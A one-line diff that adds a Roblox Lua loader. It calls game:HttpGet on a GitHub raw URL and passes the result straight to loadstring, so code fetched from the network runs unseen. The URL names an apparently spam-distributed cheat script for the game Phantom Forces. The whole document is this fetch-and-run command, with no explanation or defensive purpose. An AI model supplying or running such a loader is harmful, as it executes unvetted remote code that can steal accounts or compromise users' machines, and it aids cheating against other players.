@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/fall-weapon-remodels-phantom-forces-spam4-xf88gqh4g0gqkd.lua"))()
